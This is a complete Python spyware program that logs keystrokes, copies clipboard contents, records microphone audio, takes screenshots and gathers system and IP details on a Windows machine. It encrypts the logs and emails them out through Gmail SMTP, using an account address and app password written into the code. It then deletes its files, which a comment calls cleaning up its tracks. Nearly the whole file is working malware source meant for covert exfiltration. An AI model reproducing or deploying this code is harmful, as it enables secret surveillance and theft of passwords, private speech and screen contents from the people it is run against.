from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtpd
import smtplib

#libraries to collect system information
import socket
import platform

#library for windows clipboard
import win32clipboard

#capturing the input
from pynput.keyboard import Key, Listener #key logs the key and listener listens for the key pressed on keyboard

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass 
from requests import get

#for taking screenshot

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#constants
keys_information = "key_log.txt" #keys constant

system_information = "sys_log.txt" #sys constant

clipboard_information = "clipboard_log.txt" #clipboard constant

#encrypting the txt file

ecrp_keys_information = "ecrp_keys_information.txt"
ecrp_system_information = "ecrp_system_information.txt"
ecrp_clipboard_information = "ecrp_clipboard_information.txt"

microphoneTime = 10 #microphone time

audioInformation = "audio.wav" #microphone audio constant

screenshotInformation = "screenshot.png" #screenshot constant

timeIteration = 15 # how long a single iteration will run here: 15 seconds
numberOfIterationsEnd = 3 # Number of iteration which will run eg. 1 iteration will run 15 seconds i.e 15*3 = 45 seconds will the time taken by the program to complete the iteration

#email constants
email = "iamreedmetxt@gmail.com" #the from-email-id
password = "dzsdeujdugeoppqr " #app-password-found in 2 step verification of the account

toAddr = "iamreedmetxt@gmail.com" #email-addr to which you want to send to

#cryptography key

key = "vPkt3vDLWgOc-O10VLoddgy7BRvkvl4uKjlEU24QPNc="

#Path for storing the file
file_path = "G:\\Offical Docs\\key!0ggeR"
extend = "\\"
filePathMerged = file_path + extend

#email send function

def send_email(filename, attachment, toaddr):
    
    fromAddr = email
    msg = MIMEMultipart()

    msg ['From'] = fromAddr
    msg ['To'] = toAddr
    msg ['Subject'] = "Log-File-Subject"

    body = "test_body_email"
    msg.attach(MIMEText(body,'plain'))
    filename = filename 
    attachment = open(attachment, 'rb')

    p = MIMEBase('application','octet-stream') #default arguments to MIMEBASE
    p.set_payload((attachment).read()) #reading the attachment
    encoders.encode_base64(p) #encoding the read attachment

    p.add_header('Content-Disposition', "attachement; filename = %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls() #starting TLS session

    s.login(fromAddr, password) #logging into gmail using smtp

    text = msg.as_string() #msg to string
    
    s.sendmail(fromAddr, toAddr, text) #sending the email

    s.quit() #quitting the session

#executing the sendemail function

send_email(keys_information, file_path + extend + keys_information, toAddr)

#grabbing system information

def computerInformation():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ipAddr = socket.gethostbyname(hostname) #gets the ip address
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP +'\n')
        except Exception:
            f.write("Public IP couldn't be grabbed. Ipify Query maxed out")
        
        f.write("Processor: " + (platform.processor()) + '\n') #getting processor information
        f.write("System: " + platform.system() + "" + platform.version() + '\n') #getting system and kernel information
        f.write("Machine: " + platform.machine() + "\n") #getting machine information
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipAddr + "\n")

computerInformation() #calling the function

#clipboard function 

def clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data) #adding the copied text data to the log

        except:
            f.write("Clipboard Data couldnot be copied")

clipboard() #calling the clipboard function

#microphone function

def microphone():
    recordingFreq = 44100
    seconds = microphoneTime

    myRecording = sd.rec(int(seconds * recordingFreq ), samplerate= recordingFreq, channels=2)
    sd.wait()

    write(file_path + extend + audioInformation, recordingFreq, myRecording)
    
microphone() #calling the function

#screenshot function

def screenshot():
    screenGrab = ImageGrab.grab()
    screenGrab.save(file_path + extend + screenshotInformation)

screenshot() #calling the function

#now I want to make the keylogger capture all the pngs, .wav and other logs 
#after a specific period of time
#for that lets's the below:

numberOfIterations = 0
currentTime = time.time()
stoppingTime = time.time() + timeIteration

while numberOfIterations < numberOfIterationsEnd: #running the keylogger for a specific number of interval of time

    #logic of the keylogger

    count = 0 
    keys = []

    #keylogger functions below

    def onPress(key):
        global keys, count
        print (key)
        #appending the key to keys list
        keys.append(key)
        count +=1
        currentTime = time.time()

        #to-add new keys to the file
        if count >= 1:
            count = 0 #resetting the count to zero
            writeFiles(keys) #writing the captured keys to keys []
            keys = [] #now making the list as empty again

    def writeFiles(keys): #writing keys to a specific files
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                #when the .txt file logs the key, it takes input as 'h''e''l''l''o'
                #for me to remove the ' I need to do convert the list to string and strip ' with &nbsp;
                k = str(key).replace("'","")
                #if space is entered then enter a new line
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1: #if the word "Key" is NOT FOUND then execute this condition
                    f.write(k)
                    f.close()
                

    #exiting the keylogger
    def onRelease(key):
        if key == Key.esc: #when esc is pressed
            return False #exit out of keylogger
        if currentTime > stoppingTime:
            return False

    #Listener: which listens to the key press
    with Listener (on_press=onPress, on_release= onRelease) as listener:
        listener.join() #joins the keys together
    
    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ") #clearing the content of the file so we can send a fresh one every time

            screenshot()
            send_email(screenshotInformation, file_path + extend + screenshotInformation, toAddr)
            clipboard()

            numberOfIterations +=1

            currentTime = time.time()
            stoppingTime = time.time() + timeIteration
            

#encryption of files logic
fileToEncrypt = [filePathMerged + system_information , filePathMerged + clipboard_information , filePathMerged + keys_information]
encryptedFilesNames =  [filePathMerged + ecrp_system_information , filePathMerged + ecrp_clipboard_information , filePathMerged + ecrp_keys_information]

count = 0

for encryptingFiles in fileToEncrypt:
    
    #opening the current file at index 0
    with open (fileToEncrypt[count], "rb") as f:
        data = f.read()
    
    #encrypting the data
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    #adding the encrypted data to the new encrypted file
    with open (encryptedFilesNames[count], "wb") as f:
        f.write(encrypted)
    
    #sending the email with new encrypted files
    send_email(encryptedFilesNames[count], encryptedFilesNames[count], toAddr)
    count +=1

#Creating a time gap between the emails
time.sleep(120)

#cleaning the environment from my tracks and deleting the files

deleteFiles = [system_information, clipboard_information, keys_information, screenshotInformation, audioInformation]

for files in deleteFiles:
    os.remove(filePathMerged + files)